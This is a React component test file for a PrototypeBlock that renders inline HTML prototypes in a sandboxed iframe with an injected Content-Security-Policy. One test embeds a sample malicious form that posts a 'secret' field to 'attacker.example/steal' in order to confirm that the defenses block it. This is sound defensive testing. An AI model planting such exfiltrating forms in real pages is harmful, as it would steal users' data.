import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { PrototypeBlock } from "../blocks/blocks";
import type { ArtifactSummary, PayloadRef } from "../ipc/types";

function artifact(): ArtifactSummary {
  return {
    id: "art-1",
    workspace_id: "ws-1",
    kind: "prototype",
    title: "Onboarding flow A",
    summary: "Calm-by-default",
    author_role: "designer",
    version: 1,
    created_at: "2026-04-25T00:00:00Z",
    updated_at: "2026-04-25T00:00:00Z",
    pinned: false,
  };
}

function renderBlock(payload: PayloadRef | null) {
  return render(
    <PrototypeBlock
      artifact={artifact()}
      payload={payload}
      isPinned={false}
      onTogglePin={() => {}}
      expanded={false}
      onToggleExpanded={() => {}}
    />,
  );
}

describe("PrototypeBlock", () => {
  it("renders the sandboxed iframe when payload is inline HTML", () => {
    const html = "<!doctype html><html><head></head><body><h1>Variant A</h1></body></html>";
    const { container } = renderBlock({ kind: "inline", body: html });
    const iframe = container.querySelector("iframe.prototype-frame");
    expect(iframe).not.toBeNull();
    // Restrictive sandbox: no token at all — no scripts, no forms, no popups.
    expect(iframe!.getAttribute("sandbox")).toBe("");
    // CSP meta is injected into the rendered srcdoc.
    const srcdoc = iframe!.getAttribute("srcdoc") ?? "";
    expect(srcdoc).toContain("Content-Security-Policy");
    expect(srcdoc).toContain("form-action 'none'");
    expect(srcdoc).toContain("script-src 'none'");
    // Original markup is preserved.
    expect(srcdoc).toContain("<h1>Variant A</h1>");
    expect(iframe!.getAttribute("title")).toBe("Onboarding flow A");
    // Placeholder is gone.
    expect(container.querySelector(".block__prototype-placeholder")).toBeNull();
  });

  it("hardens against form-action XSS — sandbox excludes allow-forms and CSP blocks form submission", () => {
    const malicious =
      '<form action="https://attacker.example/steal" method="POST"><input name="x" value="secret"></form>';
    const { container } = renderBlock({ kind: "inline", body: malicious });
    const iframe = container.querySelector("iframe.prototype-frame");
    expect(iframe).not.toBeNull();
    // Defense 1: empty sandbox attribute disables form submission.
    const sandbox = iframe!.getAttribute("sandbox") ?? "<missing>";
    expect(sandbox).not.toContain("allow-forms");
    expect(sandbox).toBe("");
    // Defense 2: CSP form-action 'none' is in the rendered document.
    const srcdoc = iframe!.getAttribute("srcdoc") ?? "";
    expect(srcdoc).toContain("form-action 'none'");
  });

  it("falls back to the placeholder when no payload is supplied", () => {
    const { container } = renderBlock(null);
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector(".block__prototype-placeholder")).not.toBeNull();
  });

  it("falls back to the placeholder when the payload is hash-addressed (not inline)", () => {
    const { container } = renderBlock({ kind: "hash", hash: "abcd", size: 4096 });
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector(".block__prototype-placeholder")).not.toBeNull();
  });
});
